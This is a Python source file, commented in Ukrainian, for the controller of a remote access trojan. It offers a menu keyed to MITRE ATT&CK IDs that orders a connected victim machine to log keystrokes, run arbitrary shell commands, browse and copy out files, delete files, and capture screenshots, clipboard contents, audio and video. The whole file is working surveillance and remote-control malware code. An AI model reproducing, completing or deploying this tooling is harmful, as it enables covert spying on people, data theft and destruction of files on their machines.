# Сервер
import socket
import os

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 8080))  # 0.0.0.0 дозволяє прослуховувати всі доступні інтерфейси
server_socket.listen(1)

print("Сервер слухає на порті 8080...")

client_socket, client_address = server_socket.accept()
print(f"З'єднано з {client_address}")

# 1056 - Input Capture
def int_capt():
    message = "1056"
    client_socket.send(message.encode('utf-8'))

    client_socket.send(input('How many keys do you want to get: ').encode())

    file_path = 'key_log.txt'

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    with open(file_path, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {file_path} отримано від клієнта")

# 1057 - Process Discovery
def proc_disc():
    message = "1057"
    client_socket.send(message.encode('utf-8'))

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    file_path = 'processes.txt'
    with open(file_path, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {file_path} отримано від клієнта")

    print('Processes: ')

    with open('processes.txt', 'r') as file:
        # Читання вмісту файлу і виведення його на екран
        content = file.read()
        print(content)

# 1059 - Command-Line Interface
def cline_int():
    message = "1059"
    client_socket.send(message.encode('utf-8'))

    instr = input('Please enter command (cmd vocabulary):')
    client_socket.send(instr.encode())

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    file_path = 'cmd_res.txt'
    with open(file_path, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {file_path} отримано від клієнта")

    print('Cmd result: ')

    with open(file_path, 'r', encoding='utf-8') as file:
        # Читання вмісту файлу і виведення його на екран
        content = file.read()
        print(content)

# 1082 - System Information Discovery
def sinf_disc():
    message = "1082"
    client_socket.send(message.encode('utf-8'))

    sys_information = client_socket.recv(1024).decode()

    print(sys_information)

# 1083 - File and Directory Discovery
def fd_disc():
    message = "1083"
    client_socket.send(message.encode('utf-8'))

    while True:
        print('show - Show directoryes\nopen - Open directory \nexit - Exit Directory Discovery')

        instruction = input('Chose option: ')

        if instruction == 'show':
            instr = 'show'
            client_socket.send(str(instr).encode())
        if instruction == 'open':
            client_socket.send(input('Chose directory to open: ').encode())
        if instruction == 'exit':
            instr = 'exit'
            client_socket.send(str(instr).encode())
            break

        file_size = int(client_socket.recv(1024).decode('utf-8'))

        file_path = 'dir_res.txt'
        with open(file_path, 'wb') as file:
            data_received = 0
            while data_received < file_size:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
                data_received += len(data)

        print(f"Файл {file_path} отримано від клієнта")

        print('Directories: ')

        with open(file_path, 'r', encoding='utf-8') as file:
            # Читання вмісту файлу і виведення його на екран
            content = file.read()
            print(content)

# 1105 - Remote File Copy
def remf_copy():
    message = "1105"
    client_socket.send(message.encode('utf-8'))

    name = input('Please enter name of the copy: ')

    client_socket.send(input('Path to file: ').encode())

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    with open(name, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {name} скопійовано у клієнта")

# 1107 - File Deletion
def f_del():
    message = "1107"
    client_socket.send(message.encode('utf-8'))

    client_socket.send(input('Path to file: ').encode())

    print('File succesfully deleted')

# 1113 - Screen Capture
def src_capt():
    message = "1113"
    client_socket.send(message.encode('utf-8'))

    index = 1
    while True:
        file_path = f'scr{index}.png'
        if not os.path.exists(file_path):
            break
        index += 1

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    with open(file_path, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {file_path} отримано від клієнта")

# 1115 - Clipboard Data
def cl_data():
    message = "1115"
    client_socket.send(message.encode('utf-8'))

    res = client_socket.recv(1024).decode()
    print('Clipboard Data: ')
    print(res)

# 1123 - Audio Capture
def aud_capt():
    message = "1123"
    client_socket.send(message.encode('utf-8'))

    video_length = input('Audio сapture length in seconds: ')
    client_socket.send(str(video_length).encode())

    index = 1
    while True:
        file_path = f'audio{index}.mp4'
        if not os.path.exists(file_path):
            break
        index += 1

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    with open(file_path, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {file_path} отримано від клієнта")

# 1125 - Video Capture
def vid_capt():
    message = "1125"
    client_socket.send(message.encode('utf-8'))

    video_length = input('Video length in seconds: ')
    client_socket.send(str(video_length).encode())

    index = 1
    while True:
        file_path = f'record{index}.mp4'
        if not os.path.exists(file_path):
            break
        index += 1

    file_size = int(client_socket.recv(1024).decode('utf-8'))

    with open(file_path, 'wb') as file:
        data_received = 0
        while data_received < file_size:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            data_received += len(data)

    print(f"Файл {file_path} отримано від клієнта")

def sinkhole():
    message = "0"
    client_socket.send(message.encode('utf-8'))

    data = client_socket.recv(4096)
    print("Received system information from the server:\n", data.decode())

while True:
    print('1056 - Input Capture\n1057 - Process Discovery\n1059 - Command-Line Interface\n'
          '1082 - System Information Discovery\n1083 - File and Directory Discovery\n'
          '1105 - Remote File Copy\n1107 - File Deletion\n1113 - Screen Capture\n'
          '1115 - Clipboard Data\n1123 - Audio Capture\n1125 - Video Capture\n0 - Sinkhole\nexit - Exit socket')

    instruction = input('Please choose MITRE ATT&CK: ')

    if instruction == '1056':
        int_capt()
    if instruction == '1057':
        proc_disc()
    if instruction == '1059':
        cline_int()
    if instruction == '1082':
        sinf_disc()
    if instruction == '1083':
        fd_disc()
    if instruction == '1105':
        remf_copy()
    if instruction == '1107':
        f_del()
    if instruction == '1113':
        src_capt()
    if instruction == '1115':
        cl_data()
    if instruction == '1123':
        aud_capt()
    if instruction == '1125':
        vid_capt()
    if instruction == '0':
        sinkhole()
    if instruction == 'exit':
        client_socket.send('exit'.encode())
        break

client_socket.close()